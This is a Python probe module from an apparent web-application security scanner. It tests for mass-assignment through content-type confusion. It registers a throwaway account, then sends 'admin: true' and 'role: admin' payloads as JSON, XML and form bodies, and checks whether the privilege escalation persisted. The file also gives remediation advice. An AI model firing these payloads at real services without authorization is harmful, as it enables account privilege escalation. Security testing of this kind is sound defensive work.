#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
JSON / XML / form-urlencoded content-type confusion.

Apps that mass-assign request bodies onto domain objects often
ship per-content-type validators with subtly different deny lists.
A field marked ``@JsonIgnore`` may be unprotected from the XML
deserialiser (Jackson XmlMapper), or vice versa. The result: a
privileged field (``admin: true``) that the JSON pipeline strips
before save still arrives at the model when the same fields are
shipped via XML or ``application/x-www-form-urlencoded``.

This probe sends three flavours of the same payload to a profile-
update endpoint:

  1. JSON (the canonical baseline).
  2. XML (Jackson XmlMapper / JAX-B parses the same property names).
  3. ``application/x-www-form-urlencoded`` (Spring binds form
     fields directly to the same model with default settings).

We register a fresh disposable account, then issue PUT/PATCH on
its profile with a privileged field set to a sentinel-tagged
true. After each variant, we GET the profile back and check
whether the privileged field reflects the new value.

Detection signal:
  At least one alternate content type (XML or form) results in
  the privileged field being persisted on the GET-back read.
"""
from __future__ import annotations

import json
import re
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

REGISTER_PATHS = (
    "/api/Users",
    "/api/users",
    "/api/register",
    "/api/v1/users",
    "/rest/user/register",
    "/register",
)

UPDATE_PATHS = (
    ("/api/users/me",       "PATCH"),
    ("/api/users/me",       "PUT"),
    ("/api/profile",        "PATCH"),
    ("/api/profile",        "PUT"),
    ("/rest/user/profile",  "POST"),
    ("/api/me",             "PATCH"),
)

GET_PATHS = (
    "/api/users/me",
    "/api/profile",
    "/api/me",
    "/rest/user/whoami",
)

# Privileged field name. ``admin`` is the canonical example; we
# also test ``role: "admin"`` shape since some servers ignore
# `admin` but bind a `role` string.
PRIV_FIELD_BOOL = "admin"
PRIV_FIELD_ROLE = "role"


def _try_register(client: SafeClient, origin: str
                   ) -> tuple[str | None, str | None, dict]:
    """Returns (token, email, diag). The token is whatever the
    login response gave us; if no token, we still return an email
    so the caller can attempt cookie-based auth."""
    email = "ctc-" + secrets.token_hex(5) + "@dast.test"
    pw = "Pr0be-" + secrets.token_hex(4)
    diag: dict = {"email": email}
    for p in REGISTER_PATHS:
        body = json.dumps({
            "email": email, "password": pw,
            "passwordRepeat": pw,
            "username": email.split("@")[0],
            "securityQuestion": {"id": 1},
            "securityAnswer": "probe",
        }).encode()
        r = client.request("POST", urljoin(origin, p),
                            headers={"Content-Type":
                                      "application/json"}, body=body)
        diag.setdefault("register_attempts", []).append({
            "path": p, "status": r.status})
        if r.status in (200, 201):
            diag["registered_path"] = p
            break
    # Login.
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                        headers={"Content-Type": "application/json"},
                        body=body)
    diag["login_status"] = r.status
    token = None
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            tok = ((doc.get("authentication") or {}).get("token")
                   if isinstance(doc, dict) else None) or doc.get("token")
            if tok:
                token = tok
        except (ValueError, json.JSONDecodeError):
            pass
    return token, email, diag


def _xml_body(canary: str) -> bytes:
    """Build an XML body that carries the privileged field. We do
    NOT include any DOCTYPE — this avoids overlap with the XXE
    probe and keeps the payload focused on the content-type
    confusion signal alone."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<user>'
        '<bio>' + canary + '</bio>'
        '<' + PRIV_FIELD_BOOL + '>true</' + PRIV_FIELD_BOOL + '>'
        '<' + PRIV_FIELD_ROLE + '>admin</' + PRIV_FIELD_ROLE + '>'
        '</user>'
    ).encode()


def _form_body(canary: str) -> bytes:
    return (
        f"bio={canary}&{PRIV_FIELD_BOOL}=true&"
        f"{PRIV_FIELD_ROLE}=admin"
    ).encode()


def _json_body(canary: str) -> bytes:
    return json.dumps({
        "bio": canary,
        PRIV_FIELD_BOOL: True,
        PRIV_FIELD_ROLE: "admin",
    }).encode()


def _check_persisted(text: str, canary: str) -> tuple[bool, str]:
    """Returns (privileged_persisted, snippet). The check requires
    BOTH our canary AND the privileged value to appear in the
    GET-back response — the canary anchors that we're looking at
    OUR record, the privileged value confirms the field stuck."""
    if not text or canary not in text:
        return False, ""
    # Look for the privileged value in proximity to the canary.
    # We do a windowed search so unrelated `"admin": true` from a
    # different record can't trick us.
    idx = text.find(canary)
    window = text[max(0, idx - 400): min(len(text), idx + 400)]
    if re.search(r'"admin"\s*:\s*true', window, re.I) or \
       re.search(r'"role"\s*:\s*"admin"', window, re.I):
        return True, window[:300]
    return False, ""


class ApiContentTypeConfusionProbe(Probe):
    name = "api_content_type_confusion"
    summary = ("Detects content-type-confusion mass-assignment — "
               "privileged fields stripped from JSON are accepted "
               "via XML or form-urlencoded body.")
    safety_class = "probe"

    def add_args(self, parser):
        parser.add_argument(
            "--update-path", action="append", default=[],
            help="Additional 'path|METHOD' to test (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        token, email, session_diag = _try_register(client, origin)
        if not token:
            return Verdict(
                validated=None, confidence=0.5, ok=True,
                summary=(f"Inconclusive: could not establish a probe "
                         f"session on {origin}."),
                evidence={"origin": origin, "session": session_diag},
            )
        auth_hdr = {"Authorization": f"Bearer {token}"}

        update_paths = list(UPDATE_PATHS)
        for u in args.update_path or []:
            if "|" in u:
                p, m = u.split("|", 1)
                update_paths.append((p.strip(), m.strip().upper()))

        attempts: list[dict] = []
        confirmed: dict | None = None

        for path, method in update_paths:
            url = urljoin(origin, path)
            # Per-path canary ensures we never confuse the read-back
            # of an old test value with the current attempt.
            canary = "ctc-" + secrets.token_hex(5)

            # ---- JSON baseline ----
            body = _json_body(canary)
            r_j = client.request(method, url, headers={
                **auth_hdr,
                "Content-Type": "application/json"}, body=body)
            attempts.append({"path": path, "method": method,
                              "ctype": "application/json",
                              "status": r_j.status})

            # ---- XML variant ----
            body = _xml_body(canary)
            r_x = client.request(method, url, headers={
                **auth_hdr,
                "Content-Type": "application/xml"}, body=body)
            attempts.append({"path": path, "method": method,
                              "ctype": "application/xml",
                              "status": r_x.status})

            # ---- form-urlencoded variant ----
            body = _form_body(canary)
            r_f = client.request(method, url, headers={
                **auth_hdr,
                "Content-Type": "application/x-www-form-urlencoded",
            }, body=body)
            attempts.append({"path": path, "method": method,
                              "ctype": "application/x-www-form-urlencoded",
                              "status": r_f.status})

            # Read profile back. We look for our canary AND the
            # privileged-field value in proximity.
            for gp in GET_PATHS:
                rb = client.request("GET", urljoin(origin, gp),
                                     headers=auth_hdr)
                if rb.status != 200 or not rb.body:
                    continue
                persisted, snippet = _check_persisted(
                    rb.text, canary)
                if persisted:
                    confirmed = {"update_path": path,
                                  "update_method": method,
                                  "read_path": gp,
                                  "canary": canary,
                                  "snippet": snippet,
                                  "json_status": r_j.status,
                                  "xml_status": r_x.status,
                                  "form_status": r_f.status}
                    break
            if confirmed:
                break

        evidence = {"origin": origin, "session": session_diag,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(
                    f"Confirmed: content-type-confusion mass-"
                    f"assignment at {origin}{confirmed['update_path']}. "
                    "Privileged fields shipped via XML or "
                    "form-urlencoded body persisted on the profile "
                    f"(seen via GET {confirmed['read_path']}); "
                    "different content-types are bound by different "
                    "deserialisers with inconsistent allow lists."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Apply the same allow-list to every content-"
                    "type binder. The cleanest fix is to refuse all "
                    "but one content type per endpoint:\n"
                    "  - Spring: declare `consumes = "
                    "MediaType.APPLICATION_JSON_VALUE` on the "
                    "controller method; reject XML / form bodies "
                    "with 415.\n"
                    "  - ASP.NET: use "
                    "`[Consumes(\"application/json\")]` and "
                    "`[ApiController]` to enforce.\n"
                    "  - Express: install a `body-parser.json()` "
                    "middleware only — never `body-parser.urlencoded()` "
                    "on a JSON API.\n"
                    "Defence in depth: explicit allow-list of "
                    "writable fields per endpoint (Spring "
                    "`@JsonView` / `@RequestBody` with a DTO that "
                    "has only the writable fields)."),
            )
        return Verdict(
            validated=False, confidence=0.80,
            summary=(f"Refuted: cycled through {len(attempts)} update "
                     f"requests across content types on {origin}; no "
                     "alternate content type persisted the privileged "
                     "field."),
            evidence=evidence,
        )


if __name__ == "__main__":
    ApiContentTypeConfusionProbe().main()
